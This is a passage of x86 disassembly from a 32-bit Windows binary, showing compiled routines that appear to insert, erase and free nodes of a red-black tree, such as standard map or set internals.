   156b3:	mov    eax,DWORD PTR [esi+0x4]
   156b6:	mov    DWORD PTR [eax+0x68],0x1
   156bd:	mov    eax,DWORD PTR [esi+0x4]
   156c0:	mov    eax,DWORD PTR [eax+0x4]
   156c3:	and    DWORD PTR [eax+0x68],0x0
   156c7:	mov    eax,DWORD PTR [esi+0x4]
   156ca:	push   DWORD PTR [eax+0x4]
   156cd:	mov    ecx,edi
   156cf:	call   0x112ec
   156d4:	mov    eax,DWORD PTR [edi+0x4]
   156d7:	cmp    esi,DWORD PTR [eax+0x4]
   156da:	jne    0x15632
   156e0:	mov    eax,DWORD PTR [edi+0x4]
   156e3:	mov    eax,DWORD PTR [eax+0x4]
   156e6:	pop    edi
   156e7:	mov    DWORD PTR [eax+0x68],0x1
   156ee:	mov    eax,DWORD PTR [ebp+0x8]
   156f1:	pop    esi
   156f2:	mov    DWORD PTR [eax],ebx
   156f4:	pop    ebx
   156f5:	pop    ebp
   156f6:	ret    0x10
   156f9:	int3   
   156fa:	int3   
   156fb:	int3   
   156fc:	int3   
   156fd:	int3   
   156fe:	mov    edi,edi
   15700:	push   ebp
   15701:	mov    ebp,esp
   15703:	push   ebx
   15704:	push   esi
   15705:	mov    esi,DWORD PTR [ebp+0x10]
   15708:	push   edi
   15709:	push   0x0
   1570b:	push   esi
   1570c:	mov    edi,ecx
   1570e:	call   0x139ca
   15713:	push   DWORD PTR [ebp+0x14]
   15716:	mov    ebx,eax
   15718:	mov    eax,ds:0x7f8c8
   1571d:	mov    DWORD PTR [ebx],eax
   1571f:	mov    eax,ds:0x7f8c8
   15724:	mov    DWORD PTR [ebx+0x8],eax
   15727:	lea    eax,[ebx+0xc]
   1572a:	push   eax
   1572b:	call   0x13aca
   15730:	inc    DWORD PTR [edi+0xc]
   15733:	cmp    esi,DWORD PTR [edi+0x4]
   15736:	je     0x15760
   15738:	mov    eax,DWORD PTR [ebp+0xc]
   1573b:	cmp    eax,DWORD PTR ds:0x7f8c8
   15741:	jne    0x15760
   15743:	lea    eax,[esi+0xc]
   15746:	push   eax
   15747:	push   DWORD PTR [ebp+0x14]
   1574a:	call   0x19790
   1574f:	test   al,al
   15751:	jne    0x15760
   15753:	mov    DWORD PTR [esi+0x8],ebx
   15756:	mov    eax,DWORD PTR [edi+0x4]
   15759:	cmp    esi,DWORD PTR [eax+0x8]
   1575c:	jne    0x1577a
   1575e:	jmp    0x1576f
   15760:	mov    DWORD PTR [esi],ebx
   15762:	mov    eax,DWORD PTR [edi+0x4]
   15765:	cmp    esi,eax
   15767:	jne    0x15774
   15769:	mov    DWORD PTR [eax+0x4],ebx
   1576c:	mov    eax,DWORD PTR [edi+0x4]
   1576f:	mov    DWORD PTR [eax+0x8],ebx
   15772:	jmp    0x1577a
   15774:	cmp    esi,DWORD PTR [eax]
   15776:	jne    0x1577a
   15778:	mov    DWORD PTR [eax],ebx
   1577a:	mov    eax,DWORD PTR [edi+0x4]
   1577d:	mov    esi,ebx
   1577f:	cmp    ebx,DWORD PTR [eax+0x4]
   15782:	je     0x15836
   15788:	mov    eax,DWORD PTR [esi+0x4]
   1578b:	xor    edx,edx
   1578d:	cmp    DWORD PTR [eax+0x1c],edx
   15790:	jne    0x15836
   15796:	mov    ecx,DWORD PTR [eax+0x4]
   15799:	cmp    eax,DWORD PTR [ecx]
   1579b:	jne    0x157d7
   1579d:	mov    ecx,DWORD PTR [ecx+0x8]
   157a0:	cmp    DWORD PTR [ecx+0x1c],edx
   157a3:	je     0x157de
   157a5:	cmp    esi,DWORD PTR [eax+0x8]
   157a8:	jne    0x157b4
   157aa:	mov    esi,eax
   157ac:	push   esi
   157ad:	mov    ecx,edi
   157af:	call   0x130ea
   157b4:	mov    eax,DWORD PTR [esi+0x4]
   157b7:	mov    DWORD PTR [eax+0x1c],0x1
   157be:	mov    eax,DWORD PTR [esi+0x4]
   157c1:	mov    eax,DWORD PTR [eax+0x4]
   157c4:	and    DWORD PTR [eax+0x1c],0x0
   157c8:	mov    eax,DWORD PTR [esi+0x4]
   157cb:	push   DWORD PTR [eax+0x4]
   157ce:	mov    ecx,edi
   157d0:	call   0x13138
   157d5:	jmp    0x1582a
   157d7:	mov    ecx,DWORD PTR [ecx]
   157d9:	cmp    DWORD PTR [ecx+0x1c],edx
   157dc:	jne    0x157fb
   157de:	mov    edx,eax
   157e0:	xor    eax,eax
   157e2:	inc    eax
   157e3:	mov    DWORD PTR [edx+0x1c],eax
   157e6:	mov    DWORD PTR [ecx+0x1c],eax
   157e9:	mov    eax,DWORD PTR [esi+0x4]
   157ec:	mov    eax,DWORD PTR [eax+0x4]
   157ef:	and    DWORD PTR [eax+0x1c],0x0
   157f3:	mov    eax,DWORD PTR [esi+0x4]
   157f6:	mov    esi,DWORD PTR [eax+0x4]
   157f9:	jmp    0x1582a
   157fb:	cmp    esi,DWORD PTR [eax]
   157fd:	jne    0x15809
   157ff:	mov    esi,eax
   15801:	push   esi
   15802:	mov    ecx,edi
   15804:	call   0x13138
   15809:	mov    eax,DWORD PTR [esi+0x4]
   1580c:	mov    DWORD PTR [eax+0x1c],0x1
   15813:	mov    eax,DWORD PTR [esi+0x4]
   15816:	mov    eax,DWORD PTR [eax+0x4]
   15819:	and    DWORD PTR [eax+0x1c],0x0
   1581d:	mov    eax,DWORD PTR [esi+0x4]
   15820:	push   DWORD PTR [eax+0x4]
   15823:	mov    ecx,edi
   15825:	call   0x130ea
   1582a:	mov    eax,DWORD PTR [edi+0x4]
   1582d:	cmp    esi,DWORD PTR [eax+0x4]
   15830:	jne    0x15788
   15836:	mov    eax,DWORD PTR [edi+0x4]
   15839:	mov    eax,DWORD PTR [eax+0x4]
   1583c:	pop    edi
   1583d:	mov    DWORD PTR [eax+0x1c],0x1
   15844:	mov    eax,DWORD PTR [ebp+0x8]
   15847:	pop    esi
   15848:	mov    DWORD PTR [eax],ebx
   1584a:	pop    ebx
   1584b:	pop    ebp
   1584c:	ret    0x10
   1584f:	int3   
   15850:	int3   
   15851:	int3   
   15852:	int3   
   15853:	int3   
   15854:	mov    edi,edi
   15856:	push   ebp
   15857:	mov    ebp,esp
   15859:	push   ecx
   1585a:	push   ecx
   1585b:	push   ebx
   1585c:	push   esi
   1585d:	mov    DWORD PTR [ebp-0x4],ecx
   15860:	push   edi
   15861:	mov    edi,DWORD PTR [ebp+0xc]
   15864:	lea    ecx,[ebp+0xc]
   15867:	call   0x1156a
   1586c:	mov    esi,DWORD PTR [edi]
   1586e:	mov    eax,ds:0x7f8cc
   15873:	mov    ebx,edi
   15875:	mov    DWORD PTR [ebp-0x8],esi
   15878:	cmp    esi,eax
   1587a:	jne    0x15898
   1587c:	mov    esi,DWORD PTR [edi+0x8]
   1587f:	mov    eax,DWORD PTR [ebx+0x4]
   15882:	mov    ecx,DWORD PTR [ebp-0x4]
   15885:	mov    DWORD PTR [esi+0x4],eax
   15888:	mov    eax,DWORD PTR [ecx+0x4]
   1588b:	cmp    DWORD PTR [eax+0x4],edi
   1588e:	jne    0x1590d
   15890:	mov    DWORD PTR [eax+0x4],esi
   15893:	jmp    0x1591b
   15898:	mov    ecx,DWORD PTR [edi+0x8]
   1589b:	cmp    ecx,eax
   1589d:	je     0x1587f
   1589f:	push   ecx
   158a0:	call   0x11492
   158a5:	mov    ebx,eax
   158a7:	mov    esi,DWORD PTR [ebx+0x8]
   158aa:	cmp    ebx,edi
   158ac:	je     0x1587f
   158ae:	mov    eax,DWORD PTR [ebp-0x8]
   158b1:	mov    DWORD PTR [eax+0x4],ebx
   158b4:	mov    eax,DWORD PTR [edi]
   158b6:	mov    DWORD PTR [ebx],eax
   158b8:	cmp    ebx,DWORD PTR [edi+0x8]
   158bb:	jne    0x158c2
   158bd:	mov    DWORD PTR [esi+0x4],ebx
   158c0:	jmp    0x158d9
   158c2:	mov    eax,DWORD PTR [ebx+0x4]
   158c5:	mov    DWORD PTR [esi+0x4],eax
   158c8:	mov    eax,DWORD PTR [ebx+0x4]
   158cb:	mov    DWORD PTR [eax],esi
   158cd:	mov    eax,DWORD PTR [edi+0x8]
   158d0:	mov    DWORD PTR [ebx+0x8],eax
   158d3:	mov    eax,DWORD PTR [edi+0x8]
   158d6:	mov    DWORD PTR [eax+0x4],ebx
   158d9:	mov    eax,DWORD PTR [ebp-0x4]
   158dc:	mov    eax,DWORD PTR [eax+0x4]
   158df:	cmp    DWORD PTR [eax+0x4],edi
   158e2:	jne    0x158e9
   158e4:	mov    DWORD PTR [eax+0x4],ebx
   158e7:	jmp    0x158f7
   158e9:	mov    eax,DWORD PTR [edi+0x4]
   158ec:	cmp    DWORD PTR [eax],edi
   158ee:	jne    0x158f4
   158f0:	mov    DWORD PTR [eax],ebx
   158f2:	jmp    0x158f7
   158f4:	mov    DWORD PTR [eax+0x8],ebx
   158f7:	mov    eax,DWORD PTR [edi+0x4]
   158fa:	mov    DWORD PTR [ebx+0x4],eax
   158fd:	mov    eax,DWORD PTR [ebx+0x14]
   15900:	mov    ecx,DWORD PTR [edi+0x14]
   15903:	mov    DWORD PTR [ebx+0x14],ecx
   15906:	mov    DWORD PTR [edi+0x14],eax
   15909:	mov    ebx,edi
   1590b:	jmp    0x1596e
   1590d:	mov    eax,DWORD PTR [edi+0x4]
   15910:	cmp    DWORD PTR [eax],edi
   15912:	jne    0x15918
   15914:	mov    DWORD PTR [eax],esi
   15916:	jmp    0x1591b
   15918:	mov    DWORD PTR [eax+0x8],esi
   1591b:	mov    eax,DWORD PTR [ecx+0x4]
   1591e:	mov    DWORD PTR [ebp-0x8],eax
   15921:	cmp    DWORD PTR [eax],edi
   15923:	jne    0x15945
   15925:	mov    edx,DWORD PTR [edi+0x8]
   15928:	cmp    edx,DWORD PTR ds:0x7f8cc
   1592e:	jne    0x15937
   15930:	mov    edx,DWORD PTR [edi+0x4]
   15933:	mov    DWORD PTR [eax],edx
   15935:	jmp    0x15945
   15937:	push   esi
   15938:	call   0x11492
   1593d:	mov    ecx,DWORD PTR [ebp-0x8]
   15940:	mov    DWORD PTR [ecx],eax
   15942:	mov    ecx,DWORD PTR [ebp-0x4]
   15945:	mov    eax,DWORD PTR [ecx+0x4]
   15948:	mov    DWORD PTR [ebp-0x8],eax
   1594b:	cmp    DWORD PTR [eax+0x8],edi
   1594e:	jne    0x1596e
   15950:	mov    ecx,DWORD PTR [edi]
   15952:	cmp    ecx,DWORD PTR ds:0x7f8cc
   15958:	jne    0x15962
   1595a:	mov    ecx,DWORD PTR [edi+0x4]
   1595d:	mov    DWORD PTR [eax+0x8],ecx
   15960:	jmp    0x1596e
   15962:	push   esi
   15963:	call   0x11470
   15968:	mov    ecx,DWORD PTR [ebp-0x8]
   1596b:	mov    DWORD PTR [ecx+0x8],eax
   1596e:	xor    edi,edi
   15970:	inc    edi
   15971:	cmp    DWORD PTR [ebx+0x14],edi
   15974:	jne    0x15a8b
   1597a:	jmp    0x15a39
   1597f:	cmp    DWORD PTR [esi+0x14],edi
   15982:	jne    0x15a88
   15988:	mov    eax,DWORD PTR [esi+0x4]
   1598b:	cmp    esi,DWORD PTR [eax]
   1598d:	jne    0x15a04
   1598f:	mov    eax,DWORD PTR [eax+0x8]
   15992:	cmp    DWORD PTR [eax+0x14],0x0
   15996:	jne    0x159b0
   15998:	mov    DWORD PTR [eax+0x14],edi
   1599b:	mov    eax,DWORD PTR [esi+0x4]
   1599e:	and    DWORD PTR [eax+0x14],0x0
   159a2:	push   DWORD PTR [esi+0x4]
   159a5:	call   0x131c8
   159aa:	mov    eax,DWORD PTR [esi+0x4]
   159ad:	mov    eax,DWORD PTR [eax+0x8]
   159b0:	mov    ecx,DWORD PTR [eax]
   159b2:	cmp    DWORD PTR [ecx+0x14],edi
   159b5:	jne    0x159bf
   159b7:	mov    ecx,DWORD PTR [eax+0x8]
   159ba:	cmp    DWORD PTR [ecx+0x14],edi
   159bd:	je     0x15a32
   159bf:	mov    ecx,DWORD PTR [eax+0x8]
   159c2:	cmp    DWORD PTR [ecx+0x14],edi
   159c5:	jne    0x159df
   159c7:	mov    ecx,DWORD PTR [eax]
   159c9:	mov    DWORD PTR [ecx+0x14],edi
   159cc:	mov    ecx,DWORD PTR [ebp-0x4]
   159cf:	and    DWORD PTR [eax+0x14],0x0
   159d3:	push   eax
   159d4:	call   0x13216
   159d9:	mov    eax,DWORD PTR [esi+0x4]
   159dc:	mov    eax,DWORD PTR [eax+0x8]
   159df:	mov    ecx,DWORD PTR [esi+0x4]
   159e2:	mov    ecx,DWORD PTR [ecx+0x14]
   159e5:	mov    DWORD PTR [eax+0x14],ecx
   159e8:	mov    ecx,DWORD PTR [esi+0x4]
   159eb:	mov    DWORD PTR [ecx+0x14],edi
   159ee:	mov    eax,DWORD PTR [eax+0x8]
   159f1:	mov    ecx,DWORD PTR [ebp-0x4]
   159f4:	mov    DWORD PTR [eax+0x14],edi
   159f7:	push   DWORD PTR [esi+0x4]
   159fa:	call   0x131c8
   159ff:	jmp    0x15a88
   15a04:	mov    eax,DWORD PTR [eax]
   15a06:	cmp    DWORD PTR [eax+0x14],0x0
   15a0a:	jne    0x15a23
   15a0c:	mov    DWORD PTR [eax+0x14],edi
   15a0f:	mov    eax,DWORD PTR [esi+0x4]
   15a12:	and    DWORD PTR [eax+0x14],0x0
   15a16:	push   DWORD PTR [esi+0x4]
   15a19:	call   0x13216
   15a1e:	mov    eax,DWORD PTR [esi+0x4]
   15a21:	mov    eax,DWORD PTR [eax]
   15a23:	mov    ecx,DWORD PTR [eax+0x8]
   15a26:	cmp    DWORD PTR [ecx+0x14],edi
   15a29:	jne    0x15a4a
   15a2b:	mov    ecx,DWORD PTR [eax]
   15a2d:	cmp    DWORD PTR [ecx+0x14],edi
   15a30:	jne    0x15a4a
   15a32:	and    DWORD PTR [eax+0x14],0x0
   15a36:	mov    esi,DWORD PTR [esi+0x4]
   15a39:	mov    ecx,DWORD PTR [ebp-0x4]
   15a3c:	mov    eax,DWORD PTR [ecx+0x4]
   15a3f:	cmp    esi,DWORD PTR [eax+0x4]
   15a42:	jne    0x1597f
   15a48:	jmp    0x15a88
   15a4a:	mov    ecx,DWORD PTR [eax]
   15a4c:	cmp    DWORD PTR [ecx+0x14],edi
   15a4f:	jne    0x15a69
   15a51:	mov    ecx,DWORD PTR [eax+0x8]
   15a54:	mov    DWORD PTR [ecx+0x14],edi
   15a57:	mov    ecx,DWORD PTR [ebp-0x4]
   15a5a:	and    DWORD PTR [eax+0x14],0x0
   15a5e:	push   eax
   15a5f:	call   0x131c8
   15a64:	mov    eax,DWORD PTR [esi+0x4]
   15a67:	mov    eax,DWORD PTR [eax]
   15a69:	mov    ecx,DWORD PTR [esi+0x4]
   15a6c:	mov    ecx,DWORD PTR [ecx+0x14]
   15a6f:	mov    DWORD PTR [eax+0x14],ecx
   15a72:	mov    ecx,DWORD PTR [esi+0x4]
   15a75:	mov    DWORD PTR [ecx+0x14],edi
   15a78:	mov    eax,DWORD PTR [eax]
   15a7a:	mov    ecx,DWORD PTR [ebp-0x4]
   15a7d:	mov    DWORD PTR [eax+0x14],edi
   15a80:	push   DWORD PTR [esi+0x4]
   15a83:	call   0x13216
   15a88:	mov    DWORD PTR [esi+0x14],edi
   15a8b:	lea    eax,[ebx+0xc]
   15a8e:	push   eax
   15a8f:	call   0x13b06
   15a94:	push   ebx
   15a95:	call   0x1d9f8
   15a9a:	mov    eax,DWORD PTR [ebp-0x4]
   15a9d:	dec    DWORD PTR [eax+0xc]
   15aa0:	mov    eax,DWORD PTR [ebp+0x8]
   15aa3:	pop    ecx
   15aa4:	mov    ecx,DWORD PTR [ebp+0xc]
   15aa7:	pop    edi
   15aa8:	pop    esi
   15aa9:	mov    DWORD PTR [eax],ecx
   15aab:	pop    ebx
   15aac:	leave  
   15aad:	ret    0x8
   15ab0:	int3   
   15ab1:	int3   
   15ab2:	int3   
   15ab3:	int3   
   15ab4:	int3   
   15ab5:	int3   
   15ab6:	mov    edi,edi
   15ab8:	push   ebp
   15ab9:	mov    ebp,esp
   15abb:	push   ebx
   15abc:	push   esi
   15abd:	push   edi
   15abe:	mov    edi,DWORD PTR [ebp+0x8]
   15ac1:	mov    ebx,ecx
   15ac3:	mov    esi,edi
   15ac5:	cmp    edi,DWORD PTR ds:0x7f8cc
   15acb:	je     0x15af3
   15acd:	push   DWORD PTR [esi+0x8]
   15ad0:	mov    ecx,ebx
   15ad2:	call   0x15ab6
   15ad7:	mov    esi,DWORD PTR [esi]
   15ad9:	lea    eax,[edi+0xc]
   15adc:	push   eax
   15add:	call   0x13b06
   15ae2:	push   edi
   15ae3:	call   0x1d9f8
   15ae8:	pop    ecx
   15ae9:	mov    edi,esi
   15aeb:	cmp    esi,DWORD PTR ds:0x7f8cc
   15af1:	jne    0x15acd
   15af3:	pop    edi
   15af4:	pop    esi
   15af5:	pop    ebx
   15af6:	pop    ebp
   15af7:	ret    0x4
   15afa:	int3   
   15afb:	int3   
   15afc:	int3   
   15afd:	int3   
   15afe:	int3   
   15aff:	int3   
   15b00:	mov    edi,edi
   15b02:	push   ebp
   15b03:	mov    ebp,esp
   15b05:	push   ebx
   15b06:	push   esi
   15b07:	mov    esi,DWORD PTR [ebp+0x10]
   15b0a:	push   edi
   15b0b:	push   0x0
   15b0d:	push   esi
   15b0e:	mov    edi,ecx
   15b10:	call   0x1393a
   15b15:	push   DWORD PTR [ebp+0x14]
   15b18:	mov    ebx,eax
   15b1a:	mov    eax,ds:0x7f8cc
   15b1f:	mov    DWORD PTR [ebx],eax
   15b21:	mov    eax,ds:0x7f8cc
   15b26:	mov    DWORD PTR [ebx+0x8],eax
   15b29:	lea    eax,[ebx+0xc]
   15b2c:	push   eax
   15b2d:	call   0x13ae8
   15b32:	inc    DWORD PTR [edi+0xc]
   15b35:	cmp    esi,DWORD PTR [edi+0x4]
   15b38:	je     0x15b5c
   15b3a:	mov    eax,DWORD PTR [ebp+0xc]
   15b3d:	cmp    eax,DWORD PTR ds:0x7f8cc
   15b43:	jne    0x15b5c
   15b45:	mov    eax,DWORD PTR [ebp+0x14]
   15b48:	mov    eax,DWORD PTR [eax]
   15b4a:	cmp    eax,DWORD PTR [esi+0xc]
   15b4d:	jl     0x15b5c
   15b4f:	mov    DWORD PTR [esi+0x8],ebx
   15b52:	mov    eax,DWORD PTR [edi+0x4]
   15b55:	cmp    esi,DWORD PTR [eax+0x8]
   15b58:	jne    0x15b76
   15b5a:	jmp    0x15b6b
   15b5c:	mov    DWORD PTR [esi],ebx
   15b5e:	mov    eax,DWORD PTR [edi+0x4]
   15b61:	cmp    esi,eax
   15b63:	jne    0x15b70
   15b65:	mov    DWORD PTR [eax+0x4],ebx
   15b68:	mov    eax,DWORD PTR [edi+0x4]
   15b6b:	mov    DWORD PTR [eax+0x8],ebx
   15b6e:	jmp    0x15b76
   15b70:	cmp    esi,DWORD PTR [eax]
   15b72:	jne    0x15b76
   15b74:	mov    DWORD PTR [eax],ebx
   15b76:	mov    eax,DWORD PTR [edi+0x4]
   15b79:	mov    esi,ebx
   15b7b:	cmp    ebx,DWORD PTR [eax+0x4]
   15b7e:	je     0x15c32
   15b84:	mov    eax,DWORD PTR [esi+0x4]
   15b87:	xor    edx,edx
   15b89:	cmp    DWORD PTR [eax+0x14],edx
   15b8c:	jne    0x15c32
   15b92:	mov    ecx,DWORD PTR [eax+0x4]
   15b95:	cmp    eax,DWORD PTR [ecx]
   15b97:	jne    0x15bd3
   15b99:	mov    ecx,DWORD PTR [ecx+0x8]
   15b9c:	cmp    DWORD PTR [ecx+0x14],edx
   15b9f:	je     0x15bda
   15ba1:	cmp    esi,DWORD PTR [eax+0x8]
   15ba4:	jne    0x15bb0
   15ba6:	mov    esi,eax
   15ba8:	push   esi
   15ba9:	mov    ecx,edi
   15bab:	call   0x131c8
   15bb0:	mov    eax,DWORD PTR [esi+0x4]
   15bb3:	mov    DWORD PTR [eax+0x14],0x1
   15bba:	mov    eax,DWORD PTR [esi+0x4]
   15bbd:	mov    eax,DWORD PTR [eax+0x4]
   15bc0:	and    DWORD PTR [eax+0x14],0x0
   15bc4:	mov    eax,DWORD PTR [esi+0x4]
   15bc7:	push   DWORD PTR [eax+0x4]
   15bca:	mov    ecx,edi
   15bcc:	call   0x13216
   15bd1:	jmp    0x15c26
   15bd3:	mov    ecx,DWORD PTR [ecx]
   15bd5:	cmp    DWORD PTR [ecx+0x14],edx
   15bd8:	jne    0x15bf7
   15bda:	mov    edx,eax
   15bdc:	xor    eax,eax
   15bde:	inc    eax
   15bdf:	mov    DWORD PTR [edx+0x14],eax
   15be2:	mov    DWORD PTR [ecx+0x14],eax
   15be5:	mov    eax,DWORD PTR [esi+0x4]
   15be8:	mov    eax,DWORD PTR [eax+0x4]
   15beb:	and    DWORD PTR [eax+0x14],0x0
   15bef:	mov    eax,DWORD PTR [esi+0x4]
   15bf2:	mov    esi,DWORD PTR [eax+0x4]
   15bf5:	jmp    0x15c26
   15bf7:	cmp    esi,DWORD PTR [eax]
   15bf9:	jne    0x15c05
   15bfb:	mov    esi,eax
   15bfd:	push   esi
   15bfe:	mov    ecx,edi
   15c00:	call   0x13216
   15c05:	mov    eax,DWORD PTR [esi+0x4]
   15c08:	mov    DWORD PTR [eax+0x14],0x1
   15c0f:	mov    eax,DWORD PTR [esi+0x4]
   15c12:	mov    eax,DWORD PTR [eax+0x4]
   15c15:	and    DWORD PTR [eax+0x14],0x0
   15c19:	mov    eax,DWORD PTR [esi+0x4]
   15c1c:	push   DWORD PTR [eax+0x4]
   15c1f:	mov    ecx,edi
   15c21:	call   0x131c8
   15c26:	mov    eax,DWORD PTR [edi+0x4]
   15c29:	cmp    esi,DWORD PTR [eax+0x4]
   15c2c:	jne    0x15b84
   15c32:	mov    eax,DWORD PTR [edi+0x4]
   15c35:	mov    eax,DWORD PTR [eax+0x4]
   15c38:	pop    edi
   15c39:	mov    DWORD PTR [eax+0x14],0x1
   15c40:	mov    eax,DWORD PTR [ebp+0x8]
   15c43:	pop    esi
   15c44:	mov    DWORD PTR [eax],ebx
   15c46:	pop    ebx
   15c47:	pop    ebp
   15c48:	ret    0x10
   15c4b:	int3   
   15c4c:	int3   
   15c4d:	int3   
   15c4e:	int3   
   15c4f:	int3   
   15c50:	mov    edi,edi
   15c52:	push   ebp
   15c53:	mov    ebp,esp
   15c55:	push   ebx
   15c56:	push   esi
   15c57:	mov    esi,DWORD PTR [ebp+0x10]
   15c5a:	push   edi
   15c5b:	push   0x0
   15c5d:	push   esi
   15c5e:	mov    edi,ecx
   15c60:	call   0x139ca
   15c65:	push   DWORD PTR [ebp+0x14]
   15c68:	mov    ebx,eax
   15c6a:	mov    eax,ds:0x7f8d4
   15c6f:	mov    DWORD PTR [ebx],eax
   15c71:	mov    eax,ds:0x7f8d4
   15c76:	mov    DWORD PTR [ebx+0x8],eax
   15c79:	lea    eax,[ebx+0xc]
   15c7c:	push   eax
   15c7d:	call   0x13b1e
   15c82:	inc    DWORD PTR [edi+0xc]
   15c85:	cmp    esi,DWORD PTR [edi+0x4]
   15c88:	je     0x15cb2
   15c8a:	mov    eax,DWORD PTR [ebp+0xc]
   15c8d:	cmp    eax,DWORD PTR ds:0x7f8d4
   15c93:	jne    0x15cb2
   15c95:	lea    eax,[esi+0xc]
   15c98:	push   eax
   15c99:	push   DWORD PTR [ebp+0x14]
   15c9c:	call   0x197c0
   15ca1:	test   al,al
   15ca3:	jne    0x15cb2
   15ca5:	mov    DWORD PTR [esi+0x8],ebx
   15ca8:	mov    eax,DWORD PTR [edi+0x4]
   15cab:	cmp    esi,DWORD PTR [eax+0x8]
   15cae:	jne    0x15ccc
   15cb0:	jmp    0x15cc1
   15cb2:	mov    DWORD PTR [esi],ebx
   15cb4:	mov    eax,DWORD PTR [edi+0x4]
   15cb7:	cmp    esi,eax
   15cb9:	jne    0x15cc6
   15cbb:	mov    DWORD PTR [eax+0x4],ebx
   15cbe:	mov    eax,DWORD PTR [edi+0x4]
   15cc1:	mov    DWORD PTR [eax+0x8],ebx
   15cc4:	jmp    0x15ccc
   15cc6:	cmp    esi,DWORD PTR [eax]
   15cc8:	jne    0x15ccc
   15cca:	mov    DWORD PTR [eax],ebx
   15ccc:	mov    eax,DWORD PTR [edi+0x4]
   15ccf:	mov    esi,ebx
   15cd1:	cmp    ebx,DWORD PTR [eax+0x4]
   15cd4:	je     0x15d88
   15cda:	mov    eax,DWORD PTR [esi+0x4]
   15cdd:	xor    edx,edx
   15cdf:	cmp    DWORD PTR [eax+0x1c],edx
   15ce2:	jne    0x15d88
   15ce8:	mov    ecx,DWORD PTR [eax+0x4]
   15ceb:	cmp    eax,DWORD PTR [ecx]
   15ced:	jne    0x15d29
   15cef:	mov    ecx,DWORD PTR [ecx+0x8]
   15cf2:	cmp    DWORD PTR [ecx+0x1c],edx
   15cf5:	je     0x15d30
   15cf7:	cmp    esi,DWORD PTR [eax+0x8]
   15cfa:	jne    0x15d06
   15cfc:	mov    esi,eax
   15cfe:	push   esi
   15cff:	mov    ecx,edi
   15d01:	call   0x132de
   15d06:	mov    eax,DWORD PTR [esi+0x4]
   15d09:	mov    DWORD PTR [eax+0x1c],0x1
   15d10:	mov    eax,DWORD PTR [esi+0x4]
   15d13:	mov    eax,DWORD PTR [eax+0x4]
   15d16:	and    DWORD PTR [eax+0x1c],0x0
   15d1a:	mov    eax,DWORD PTR [esi+0x4]
   15d1d:	push   DWORD PTR [eax+0x4]
   15d20:	mov    ecx,edi
   15d22:	call   0x1332c
   15d27:	jmp    0x15d7c
   15d29:	mov    ecx,DWORD PTR [ecx]
   15d2b:	cmp    DWORD PTR [ecx+0x1c],edx
   15d2e:	jne    0x15d4d
   15d30:	mov    edx,eax
   15d32:	xor    eax,eax
   15d34:	inc    eax
   15d35:	mov    DWORD PTR [edx+0x1c],eax
   15d38:	mov    DWORD PTR [ecx+0x1c],eax
   15d3b:	mov    eax,DWORD PTR [esi+0x4]
   15d3e:	mov    eax,DWORD PTR [eax+0x4]
   15d41:	and    DWORD PTR [eax+0x1c],0x0
   15d45:	mov    eax,DWORD PTR [esi+0x4]
   15d48:	mov    esi,DWORD PTR [eax+0x4]
   15d4b:	jmp    0x15d7c
   15d4d:	cmp    esi,DWORD PTR [eax]
   15d4f:	jne    0x15d5b
   15d51:	mov    esi,eax
   15d53:	push   esi
   15d54:	mov    ecx,edi
   15d56:	call   0x1332c
   15d5b:	mov    eax,DWORD PTR [esi+0x4]
   15d5e:	mov    DWORD PTR [eax+0x1c],0x1
   15d65:	mov    eax,DWORD PTR [esi+0x4]
   15d68:	mov    eax,DWORD PTR [eax+0x4]
   15d6b:	and    DWORD PTR [eax+0x1c],0x0
   15d6f:	mov    eax,DWORD PTR [esi+0x4]
   15d72:	push   DWORD PTR [eax+0x4]
   15d75:	mov    ecx,edi
   15d77:	call   0x132de
   15d7c:	mov    eax,DWORD PTR [edi+0x4]
   15d7f:	cmp    esi,DWORD PTR [eax+0x4]
   15d82:	jne    0x15cda
   15d88:	mov    eax,DWORD PTR [edi+0x4]
   15d8b:	mov    eax,DWORD PTR [eax+0x4]
   15d8e:	pop    edi
   15d8f:	mov    DWORD PTR [eax+0x1c],0x1
   15d96:	mov    eax,DWORD PTR [ebp+0x8]
   15d99:	pop    esi
   15d9a:	mov    DWORD PTR [eax],ebx
   15d9c:	pop    ebx
   15d9d:	pop    ebp
   15d9e:	ret    0x10
   15da1:	int3   
   15da2:	int3   
   15da3:	int3   
   15da4:	int3   
   15da5:	int3   
   15da6:	mov    edi,edi
   15da8:	push   ebp
   15da9:	mov    ebp,esp
   15dab:	push   ecx
   15dac:	push   DWORD PTR [ebp-0x4]
   15daf:	push   DWORD PTR [ebp+0x10]
   15db2:	push   DWORD PTR [ebp+0xc]
   15db5:	push   DWORD PTR [ebp+0x8]
   15db8:	call   0x14b76
   15dbd:	add    esp,0x10
   15dc0:	leave  
   15dc1:	ret    
   15dc2:	int3   
   15dc3:	int3   
   15dc4:	int3   
   15dc5:	int3   
   15dc6:	int3   
   15dc7:	int3   
   15dc8:	mov    edi,edi
   15dca:	push   ebp
   15dcb:	mov    ebp,esp
   15dcd:	push   esi
   15dce:	push   edi
   15dcf:	mov    edi,DWORD PTR [ebp+0x8]
   15dd2:	mov    al,BYTE PTR [edi+0x8]
   15dd5:	mov    esi,ecx
   15dd7:	mov    BYTE PTR [esi+0x8],al
   15dda:	call   0x144a2
   15ddf:	push   edi
   15de0:	mov    ecx,esi
   15de2:	call   0x14b14
   15de7:	pop    edi
   15de8:	mov    eax,esi
   15dea:	pop    esi
   15deb:	pop    ebp
   15dec:	ret    0x4
   15def:	int3   
   15df0:	int3   
   15df1:	int3   
   15df2:	int3   
   15df3:	int3   
   15df4:	mov    edi,edi
   15df6:	push   ebp
   15df7:	mov    ebp,esp
   15df9:	push   ecx
   15dfa:	push   esi
   15dfb:	mov    esi,ecx
   15dfd:	cmp    esi,DWORD PTR [ebp+0x8]
   15e00:	je     0x15e1e
   15e02:	mov    eax,DWORD PTR [esi+0x4]
   15e05:	mov    ecx,DWORD PTR [eax]
   15e07:	push   eax
   15e08:	push   ecx
   15e09:	lea    eax,[ebp-0x4]
   15e0c:	push   eax
   15e0d:	mov    ecx,esi
   15e0f:	call   0x14d1c
   15e14:	push   DWORD PTR [ebp+0x8]
   15e17:	mov    ecx,esi
   15e19:	call   0x14b14
   15e1e:	mov    eax,esi
   15e20:	pop    esi
   15e21:	leave  
   15e22:	ret    0x4
   15e25:	int3   
   15e26:	int3   
   15e27:	int3   
   15e28:	int3   
   15e29:	int3   
   15e2a:	mov    edi,edi
   15e2c:	push   ebp
   15e2d:	mov    ebp,esp
   15e2f:	push   ecx
   15e30:	push   ebx
   15e31:	push   esi
   15e32:	push   edi
   15e33:	xor    edi,edi
   15e35:	push   edi
